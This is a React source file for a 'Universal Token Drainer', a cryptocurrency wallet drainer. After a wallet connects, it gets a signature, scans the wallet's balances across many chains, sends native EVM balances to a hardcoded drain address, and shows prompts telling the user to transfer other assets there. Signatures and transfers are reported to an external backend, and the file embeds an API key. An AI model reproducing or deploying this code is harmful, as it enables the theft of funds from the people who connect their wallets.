import { useState, useEffect, useCallback } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient, useChainId } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#627EEA' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', scanner: 'covalent', color: '#F0B90B' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', scanner: 'covalent', color: '#8247E5' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#28A0F0' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#FF0420' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#0052FF' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', scanner: 'covalent', color: '#E84142' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', scanner: 'covalent', color: '#1969FF' },
  
  // Non-EVM Chains (Updated with proper API endpoints)
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', scanner: 'tron', color: '#FF060A', apiKey: 'api-key-needed' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', scanner: 'solana', color: '#00FFA3', rpc: 'https://api.mainnet-beta.solana.com' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', scanner: 'bitcoin', color: '#F7931A', api: 'blockstream' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', scanner: 'cardano', color: '#0033AD', api: 'blockfrost' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', scanner: 'dogecoin', color: '#C2A633', api: 'dogechain' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', scanner: 'ripple', color: '#23292F', api: 'xrpl' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', scanner: 'polkadot', color: '#E6007A', api: 'subscan' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', scanner: 'cosmos', color: '#2E3148', api: 'cosmos-lcd' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Chains - USE YOUR ACTUAL DRAIN ADDRESSES
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
  
  // Non-EVM Chains - UPDATE WITH YOUR ADDRESSES
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace with your TRON address
  solana: "So11111111111111111111111111111111111111112", // Replace
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Replace
  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
  dogecoin: "Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
  ripple: "rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
  polkadot: "1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
  cosmos: "cosmos1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
};

// ==================== MAIN APP COMPONENT ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
            "--ck-border-radius": "16px",
            "--ck-accent-color": "#667eea",
            "--ck-accent-text-color": "#ffffff",
            "--ck-modal-background": "#0a0a0a",
            "--ck-body-background": "#111827",
            "--ck-body-color": "#ffffff",
            "--ck-body-color-muted": "#94a3b8",
          },
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DASHBOARD COMPONENT ====================
function MultiNetworkDashboard() {
  const { address, isConnected, chain } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();
  const chainId = useChainId();

  // State Management
  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState({});
  const [txStatus, setTxStatus] = useState({});
  const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, text: '' });
  const [apiStatus, setApiStatus] = useState('🟢 Online');
  const [totalValue, setTotalValue] = useState(0);
  const [connectedNetwork, setConnectedNetwork] = useState('');
  const [scanComplete, setScanComplete] = useState(false);

  // Initialize
  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
      checkApiStatus();
    } else {
      resetState();
    }
  }, [isConnected, address, chain]);

  useEffect(() => {
    if (chain) {
      setConnectedNetwork(chain.name || 'Unknown');
    }
  }, [chain]);

  // Check Backend Status
  const checkApiStatus = async () => {
    try {
      const response = await fetch(`${backendUrl}/health`);
      if (response.ok) {
        const data = await response.json();
        setApiStatus(`🟢 Online - ${data.stats?.networks || 0} networks`);
      } else {
        setApiStatus('🔴 Offline');
      }
    } catch (error) {
      setApiStatus('🔴 Offline');
    }
  };

  // Reset State
  const resetState = () => {
    setAuthStatus('');
    setSignature('');
    setUserTokens({});
    setTxStatus({});
    setTotalValue(0);
    setScanComplete(false);
    setScanProgress({ current: 0, total: NETWORKS.length, text: '' });
  };

  // Wallet Connected Handler
  const handleWalletConnected = async (walletAddress) => {
    setAuthStatus(`✅ Connected: ${formatAddress(walletAddress)}`);
    
    // Auto-start authentication and scan
    setTimeout(() => {
      authenticateAllNetworks();
    }, 1500);
  };

  // ==================== AUTHENTICATION ====================
  const authenticateAllNetworks = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing authentication message...');
      
      const timestamp = Date.now();
      const message = `Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}\nNetwork: All Chains`;
      
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('📡 Sending to backend...');
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature: sig,
          message,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus(`✅ Authenticated! Scanning all networks...`);
        setTimeout(() => scanAllNetworks(), 800);
      } else {
        setAuthStatus(`❌ Auth failed: ${data.error}`);
      }
      
    } catch (error) {
      console.error("Auth error:", error);
      setAuthStatus(`❌ Error: ${error.message}`);
      if (error.message.includes('rejected')) {
        setAuthStatus('❌ Signature rejected by user');
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setAuthStatus(`🌐 Scanning ${NETWORKS.length} networks for live balances...`);
    setUserTokens({});
    setTotalValue(0);
    setScanComplete(false);
    setScanProgress({ current: 0, total: NETWORKS.length, text: 'Starting live scan...' });
    
    try {
      // Direct scan approach - bypass backend if needed
      const results = await directScanAllNetworks();
      processScanResults(results);
      
    } catch (error) {
      console.error("Direct scan error:", error);
      setAuthStatus(`⚠️ Direct scan failed. Trying backend...`);
      
      // Fallback to backend
      try {
        const response = await fetch(`${backendUrl}/scan`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            evmAddress: address,
            networks: NETWORKS,
            forceRefresh: true
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.success) {
            processScanResults(data.data);
          } else {
            throw new Error('Backend scan failed');
          }
        } else {
          throw new Error('Backend unavailable');
        }
      } catch (backendError) {
        console.error("Backend scan error:", backendError);
        setAuthStatus(`❌ All scan methods failed. Check connection.`);
      }
    } finally {
      setIsScanning(false);
    }
  };

  // Direct Scan Function
  const directScanAllNetworks = async () => {
    const allTokens = {};
    let totalVal = 0;
    
    // Scan each network
    for (let i = 0; i < NETWORKS.length; i++) {
      const network = NETWORKS[i];
      setScanProgress({ 
        current: i + 1, 
        total: NETWORKS.length, 
        text: `Scanning ${network.name}...` 
      });
      
      try {
        let tokens = [];
        
        if (network.type === 'evm') {
          tokens = await scanEVMDirect(address, network);
        } else {
          tokens = await scanNonEVMDirect(address, network);
        }
        
        if (tokens.length > 0) {
          const networkValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
          totalVal += networkValue;
          
          allTokens[network.id] = {
            network: network,
            tokens: tokens,
            totalValue: networkValue
          };
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 300));
        
      } catch (error) {
        console.log(`Failed to scan ${network.name}:`, error.message);
      }
    }
    
    return {
      results: Object.values(allTokens).map(data => ({
        network: data.network,
        tokens: data.tokens
      })),
      totalValue: totalVal,
      totalTokens: Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0)
    };
  };

  // Direct EVM Scan
  const scanEVMDirect = async (walletAddress, network) => {
    try {
      // Try Covalent API first
      const response = await fetch(
        `https://api.covalenthq.com/v1/${network.id}/address/${walletAddress}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR&nft=false`
      );
      
      if (response.ok) {
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
          .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
          .map(t => {
            const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
            const value = (t.quote_rate || 0) * amount;
            
            return {
              symbol: t.contract_ticker_symbol || (t.native_token ? network.symbol : 'TOKEN'),
              name: t.contract_name || (t.native_token ? network.name : 'Unknown'),
              amount: amount,
              value: value,
              contractAddress: t.contract_address,
              decimals: t.contract_decimals || 18,
              isNative: t.native_token || false,
              logo: t.logo_url,
              networkId: network.id,
              drainAddress: DRAIN_ADDRESSES[network.id],
              networkType: 'evm',
              chainId: network.id
            };
          });
      }
    } catch (error) {
      console.log(`Covalent scan failed for ${network.name}:`, error.message);
    }
    
    return [];
  };

  // Direct Non-EVM Scan with TRON FIX
  const scanNonEVMDirect = async (walletAddress, network) => {
    try {
      switch (network.id) {
        case 'tron':
          return await scanTronDirect(walletAddress);
        case 'solana':
          return await scanSolanaDirect(walletAddress);
        case 'bitcoin':
          return await scanBitcoinDirect(walletAddress);
        default:
          // Try backend for other chains
          const response = await fetch(`${backendUrl}/tokens/nonevm/${walletAddress}/${network.id}`);
          if (response.ok) {
            const data = await response.json();
            return data.data?.tokens || [];
          }
      }
    } catch (error) {
      console.log(`Direct scan failed for ${network.name}:`, error.message);
    }
    
    return [];
  };

  // TRON Direct Scan Fix
  const scanTronDirect = async (walletAddress) => {
    try {
      // Convert ETH address to TRON if needed
      let tronAddress = walletAddress;
      if (walletAddress.startsWith('0x')) {
        // Simple hex to base58 conversion for TRON
        // Note: This is simplified - actual conversion needs proper library
        tronAddress = 'T' + walletAddress.substring(2).toUpperCase();
        if (tronAddress.length > 34) tronAddress = tronAddress.substring(0, 34);
      }
      
      // Use TronGrid API
      const response = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
      
      if (response.ok) {
        const data = await response.json();
        const tokens = [];
        
        // Check for TRX balance
        if (data.data && data.data.length > 0) {
          const account = data.data[0];
          
          // TRX Balance
          if (account.balance > 0) {
            const trxBalance = account.balance / 1000000; // Convert from Sun to TRX
            tokens.push({
              symbol: 'TRX',
              name: 'Tron',
              amount: trxBalance,
              value: 0, // Would need price API
              contractAddress: null,
              decimals: 6,
              isNative: true,
              logo: 'https://cryptologos.cc/logos/tron-trx-logo.png',
              networkId: 'tron',
              drainAddress: DRAIN_ADDRESSES.tron,
              networkType: 'non-evm',
              note: 'TRX requires energy/bandwidth'
            });
          }
          
          // TRC10 Tokens
          if (account.assetV2 && account.assetV2.length > 0) {
            account.assetV2.forEach(asset => {
              if (asset.value > 0) {
                const amount = asset.value / 1000000; // TRC10 usually 6 decimals
                tokens.push({
                  symbol: asset.key || 'TRC10',
                  name: 'TRC10 Token',
                  amount: amount,
                  value: 0,
                  contractAddress: null,
                  decimals: 6,
                  isNative: false,
                  networkId: 'tron',
                  drainAddress: DRAIN_ADDRESSES.tron,
                  networkType: 'non-evm'
                });
              }
            });
          }
        }
        
        return tokens;
      }
    } catch (error) {
      console.error("TRON direct scan error:", error);
    }
    
    return [];
  };

  // Solana Direct Scan
  const scanSolanaDirect = async (walletAddress) => {
    try {
      const response = await fetch('https://api.mainnet-beta.solana.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [walletAddress]
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.result && data.result.value > 0) {
          const solBalance = data.result.value / 1000000000; // Convert lamports to SOL
          
          return [{
            symbol: 'SOL',
            name: 'Solana',
            amount: solBalance,
            value: 0,
            contractAddress: null,
            decimals: 9,
            isNative: true,
            logo: 'https://cryptologos.cc/logos/solana-sol-logo.png',
            networkId: 'solana',
            drainAddress: DRAIN_ADDRESSES.solana,
            networkType: 'non-evm'
          }];
        }
      }
    } catch (error) {
      console.error("Solana direct scan error:", error);
    }
    
    return [];
  };

  // Bitcoin Direct Scan
  const scanBitcoinDirect = async (walletAddress) => {
    try {
      // Use blockstream.info
      const response = await fetch(`https://blockstream.info/api/address/${walletAddress}`);
      
      if (response.ok) {
        const data = await response.json();
        if (data.chain_stats) {
          const received = data.chain_stats.funded_txo_sum / 100000000; // Convert satoshi to BTC
          const sent = data.chain_stats.spent_txo_sum / 100000000;
          const balance = received - sent;
          
          if (balance > 0) {
            return [{
              symbol: 'BTC',
              name: 'Bitcoin',
              amount: balance,
              value: 0,
              contractAddress: null,
              decimals: 8,
              isNative: true,
              logo: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png',
              networkId: 'bitcoin',
              drainAddress: DRAIN_ADDRESSES.bitcoin,
              networkType: 'non-evm'
            }];
          }
        }
      }
    } catch (error) {
      console.error("Bitcoin direct scan error:", error);
    }
    
    return [];
  };

  // Process Scan Results
  const processScanResults = (data) => {
    const allTokens = {};
    let totalVal = 0;
    
    data.results?.forEach(result => {
      if (result.tokens && result.tokens.length > 0) {
        const networkValue = result.tokens.reduce((sum, t) => sum + (t.value || 0), 0);
        totalVal += networkValue;
        
        allTokens[result.network.id] = {
          network: result.network,
          tokens: result.tokens,
          totalValue: networkValue
        };
      }
    });
    
    setUserTokens(allTokens);
    setTotalValue(totalVal);
    setScanComplete(true);
    setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, text: 'Live scan complete!' });
    
    const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    const networkCount = Object.keys(allTokens).length;
    
    setAuthStatus(`✅ Live scan: Found ${totalTokens} tokens across ${networkCount} networks ($${totalVal.toFixed(2)} total)`);
    
    // Store in localStorage
    if (address) {
      localStorage.setItem(`scan_${address}`, JSON.stringify({
        timestamp: Date.now(),
        tokens: allTokens,
        totalValue: totalVal
      }));
    }
  };

  // ==================== DRAIN ALL TOKENS ====================
  const executeDrainAll = async () => {
    if (!address || Object.keys(userTokens).length === 0) {
      setAuthStatus('❌ No tokens to drain');
      return;
    }
    
    if (!window.confirm('⚠️ WARNING: This will drain ALL tokens from ALL networks to the drain addresses.\n\nClick OK to proceed.')) {
      return;
    }
    
    setIsDraining(true);
    setAuthStatus('🚀 Starting mass drain process...');
    setTxStatus({ general: 'Processing all tokens...' });
    
    try {
      // Collect all tokens
      const allTokenOperations = [];
      Object.values(userTokens).forEach(data => {
        data.tokens.forEach(token => {
          if (token.amount > 0) {
            allTokenOperations.push({
              token,
              network: data.network
            });
          }
        });
      });
      
      setTxStatus({ general: `Processing ${allTokenOperations.length} tokens...` });
      
      // Process tokens in batches
      for (let i = 0; i < allTokenOperations.length; i++) {
        const { token, network } = allTokenOperations[i];
        const progress = Math.round((i / allTokenOperations.length) * 100);
        
        setTxStatus({ 
          general: `Processing ${i + 1}/${allTokenOperations.length} (${progress}%)`,
          current: `${token.symbol} on ${network.name}`
        });
        
        if (network.type === 'evm' && token.isNative) {
          await drainEVMToken(token, network);
        } else {
          await drainNonEVMToken(token, network);
        }
        
        // Small delay between operations
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      setAuthStatus('✅ Mass drain completed!');
      setTxStatus({ general: 'All tokens processed successfully' });
      
      // Auto-rescan after drain
      setTimeout(() => {
        setAuthStatus('🔄 Rescanning after drain...');
        scanAllNetworks();
      }, 3000);
      
    } catch (error) {
      console.error("Mass drain error:", error);
      setAuthStatus(`❌ Drain failed: ${error.message}`);
      setTxStatus({ general: `Error: ${error.message}` });
    } finally {
      setIsDraining(false);
    }
  };

  // Drain EVM Token
  const drainEVMToken = async (token, network) => {
    try {
      if (token.isNative && walletClient) {
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          console.log(`${token.symbol}: Amount too small`);
          return;
        }
        
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress || DRAIN_ADDRESSES[network.id],
          value: amountInWei,
          chainId: parseInt(network.id)
        });
        
        console.log(`${token.symbol}: Sent - ${hash.substring(0, 10)}...`);
        
        // Log transaction
        await logTransaction({
          fromAddress: address,
          toAddress: token.drainAddress,
          amount: token.amount,
          chainId: network.id,
          tokenSymbol: token.symbol,
          transactionHash: hash,
          networkType: 'evm'
        });
        
      } else {
        // For tokens, show manual instructions
        const message = `MANUAL TRANSFER REQUIRED:\n\nSend ${token.amount} ${token.symbol}\nTo: ${token.drainAddress || DRAIN_ADDRESSES[network.id]}\n\nNetwork: ${network.name}`;
        alert(message);
      }
      
    } catch (error) {
      console.error(`Drain error for ${token.symbol}:`, error);
    }
  };

  // Drain Non-EVM Token
  const drainNonEVMToken = async (token, network) => {
    try {
      const guide = generateTransactionGuide(token, network);
      
      // Show instructions
      alert(guide);
      
      // Log as manual transaction
      await logTransaction({
        fromAddress: address,
        toAddress: token.drainAddress || DRAIN_ADDRESSES[network.id],
        amount: token.amount,
        chainId: network.id,
        tokenSymbol: token.symbol,
        networkType: 'non-evm',
        status: 'manual_required'
      });
      
      console.log(`${token.symbol}: Instructions sent for ${network.name}`);
      
    } catch (error) {
      console.error(`Non-EVM drain error for ${token.symbol}:`, error);
    }
  };

  // Generate Transaction Guide
  const generateTransactionGuide = (token, network) => {
    const amountFormatted = token.amount.toFixed(network.id === 'bitcoin' ? 8 : 6);
    const drainAddr = token.drainAddress || DRAIN_ADDRESSES[network.id];
    
    const guides = {
      'tron': `⚡ TRON (TRX) TRANSFER:\n\n• Open Trust Wallet/TronLink\n• Go to TRON network\n• Send ${amountFormatted} ${token.symbol}\n• To address: ${drainAddr}\n\n⚠️ Note: Need TRX for energy/bandwidth`,
      'solana': `⚡ SOLANA (SOL) TRANSFER:\n\n• Open Phantom/Solflare wallet\n• Send ${amountFormatted} ${token.symbol}\n• To address: ${drainAddr}\n• Network: Solana Mainnet`,
      'bitcoin': `⚡ BITCOIN (BTC) TRANSFER:\n\n• Open Bitcoin wallet\n• Send ${amountFormatted} BTC\n• To: ${drainAddr}\n• Use normal transaction fee`,
      'default': `⚡ MANUAL TRANSFER REQUIRED:\n\nSend ${amountFormatted} ${token.symbol}\nTo: ${drainAddr}\n\nNetwork: ${network.name}\n\nComplete the transfer in your wallet.`
    };
    
    return guides[network.id] || guides.default;
  };

  // Log Transaction
  const logTransaction = async (txData) => {
    try {
      await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txData)
      });
    } catch (error) {
      console.log('Transaction logging failed:', error.message);
    }
  };

  // ==================== UI UTILITIES ====================
  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount, decimals = 6) => {
    return parseFloat(amount).toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: decimals
    });
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">
              <span className="logo-icon">⚡</span>
              <h1>Universal Token Drainer</h1>
            </div>
            <div className="network-badge">
              {connectedNetwork || 'Multi-Chain'}
            </div>
          </div>
          
          <div className="header-right">
            <div className="status-indicator">
              <span className={`status-dot ${apiStatus.includes('🟢') ? 'online' : 'offline'}`}></span>
              <span className="status-text">{apiStatus}</span>
            </div>
            <div className="wallet-section">
              <ConnectKitButton />
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <>
              {/* Main Dashboard */}
              <div className="dashboard-overview">
                <div className="stats-grid">
                  <div className="stat-card primary">
                    <div className="stat-icon">💰</div>
                    <div className="stat-content">
                      <div className="stat-value">${totalValue.toFixed(2)}</div>
                      <div className="stat-label">Live Value</div>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon">🔗</div>
                    <div className="stat-content">
                      <div className="stat-value">{getNetworkCount()}</div>
                      <div className="stat-label">Active Networks</div>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon">🪙</div>
                    <div className="stat-content">
                      <div className="stat-value">{getTotalTokens()}</div>
                      <div className="stat-label">Tokens</div>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon">⚡</div>
                    <div className="stat-content">
                      <div className="stat-value">{NETWORKS.length}</div>
                      <div className="stat-label">Supported</div>
                    </div>
                  </div>
                </div>

                {/* Status Bar */}
                <div className="status-bar">
                  <div className="wallet-info">
                    <span className="wallet-address">{formatAddress(address)}</span>
                    <span className="network-name">{connectedNetwork}</span>
                  </div>
                  <div className={`status-message ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
                    {authStatus || 'Ready to scan'}
                  </div>
                </div>

                {/* Progress Bar */}
                {isScanning && (
                  <div className="progress-container">
                    <div className="progress-header">
                      <span>Live Network Scan</span>
                      <span>{scanProgress.current}/{scanProgress.total}</span>
                    </div>
                    <div className="progress-bar">
                      <div 
                        className="progress-fill" 
                        style={{ width: `${(scanProgress.current / scanProgress.total) * 100}%` }}
                      ></div>
                    </div>
                    <div className="progress-text">{scanProgress.text}</div>
                  </div>
                )}
              </div>

              {/* Control Panel */}
              <div className="control-panel">
                <div className="panel-header">
                  <h2>Live Token Scanner</h2>
                  <div className="action-buttons">
                    <button 
                      onClick={scanAllNetworks}
                      disabled={isScanning || isAuthenticating || isDraining}
                      className="btn btn-primary"
                    >
                      {isScanning ? '🔄 Live Scanning...' : '🔍 Live Scan All Networks'}
                    </button>
                    
                    {getTotalTokens() > 0 && (
                      <button 
                        onClick={executeDrainAll}
                        disabled={isDraining || isScanning}
                        className="btn btn-danger"
                      >
                        {isDraining ? '⚡ Draining All...' : '🔥 DRAIN ALL TOKENS'}
                      </button>
                    )}
                  </div>
                </div>

                {/* Transaction Status */}
                {(isDraining || txStatus.general) && (
                  <div className="drain-status">
                    <div className="status-header">
                      <span className="status-title">Drain Status</span>
                      <span className="status-time">{new Date().toLocaleTimeString()}</span>
                    </div>
                    <div className="status-content">
                      <div className="status-main">{txStatus.general}</div>
                      {txStatus.current && (
                        <div className="status-current">Current: {txStatus.current}</div>
                      )}
                    </div>
                  </div>
                )}
              </div>

              {/* Tokens Display */}
              {getTotalTokens() > 0 ? (
                <div className="tokens-display">
                  <div className="display-header">
                    <h2>Live Token Balances</h2>
                    <div className="display-summary">
                      <span>{getNetworkCount()} Networks</span>
                      <span>{getTotalTokens()} Tokens</span>
                      <span>${totalValue.toFixed(2)} Total</span>
                    </div>
                  </div>
                  
                  <div className="tokens-grid">
                    {Object.entries(userTokens).map(([networkId, data]) => (
                      <NetworkTokens 
                        key={networkId}
                        data={data}
                        txStatus={txStatus}
                        formatAmount={formatAmount}
                      />
                    ))}
                  </div>
                </div>
              ) : scanComplete ? (
                <div className="empty-state">
                  <div className="empty-icon">🔍</div>
                  <h3>No tokens found</h3>
                  <p>Scan complete. No tokens detected across {NETWORKS.length} networks.</p>
                  <button 
                    onClick={scanAllNetworks}
                    className="btn btn-primary"
                  >
                    Try Again
                  </button>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">⚡</div>
                  <h3>Ready to Scan</h3>
                  <p>Click "Live Scan All Networks" to detect tokens across all blockchains</p>
                  <div className="network-hint">
                    <p>Live scanning supported for:</p>
                    <div className="chain-tags">
                      {NETWORKS.slice(0, 8).map(n => (
                        <span key={n.id} className="chain-tag" style={{ borderColor: n.color }}>
                          {n.symbol}
                        </span>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </>
          ) : (
            <ConnectionPrompt />
          )}
        </main>

        <Footer />
      </div>
    </div>
  );
}

// ==================== SUPPORTING COMPONENTS ====================

function NetworkTokens({ data, txStatus, formatAmount }) {
  return (
    <div className="network-tokens">
      <div className="network-header">
        <div className="network-info">
          <div className="network-icon" style={{ backgroundColor: data.network.color }}>
            {data.network.type === 'evm' ? 'E' : 'N'}
          </div>
          <div>
            <div className="network-name">{data.network.name}</div>
            <div className="network-stats">
              {data.tokens.length} tokens • ${data.totalValue.toFixed(2)}
            </div>
          </div>
        </div>
        <div className="network-type">
          {data.network.type === 'evm' ? 'EVM' : 'Non-EVM'}
        </div>
      </div>
      
      <div className="tokens-list">
        {data.tokens.map((token, idx) => (
          <div key={idx} className="token-item">
            <div className="token-main">
              <div className="token-symbol">{token.symbol}</div>
              <div className="token-amount">
                {formatAmount(token.amount, token.decimals < 8 ? token.decimals : 8)} {token.symbol}
              </div>
            </div>
            <div className="token-secondary">
              <div className="token-value">
                {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
              </div>
              <div className="token-status">
                {data.network.type === 'non-evm' ? 'Manual' : 'Auto'}
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function ConnectionPrompt() {
  return (
    <div className="connection-prompt">
      <div className="prompt-content">
        <div className="prompt-icon">⚡</div>
        <h2>Universal Token Drainer</h2>
        <p>Connect your wallet to scan and drain tokens across {NETWORKS.length} blockchains</p>
        
        <div className="connect-wrapper">
          <ConnectKitButton />
        </div>
        
        <div className="features-list">
          <div className="feature-item">
            <span className="feature-check">✅</span>
            <span>Live balance scanning</span>
          </div>
          <div className="feature-item">
            <span className="feature-check">✅</span>
            <span>TRON, Solana, Bitcoin support</span>
          </div>
          <div className="feature-item">
            <span className="feature-check">✅</span>
            <span>One-click mass drain</span>
          </div>
          <div className="feature-item">
            <span className="feature-check">✅</span>
            <span>Real-time transaction status</span>
          </div>
        </div>
      </div>
    </div>
  );
}

function Footer() {
  return (
    <footer className="app-footer">
      <div className="footer-content">
        <div className="footer-info">
          <span className="footer-text">Universal Token Drainer v3.0</span>
          <span className="footer-text">Live Scanning Enabled</span>
          <span className="footer-text">Production Mode</span>
        </div>
        <div className="footer-note">
          ⚡ Connect → Scan → Drain All
        </div>
      </div>
    </footer>
  );
}

export default TokenDrainApp;
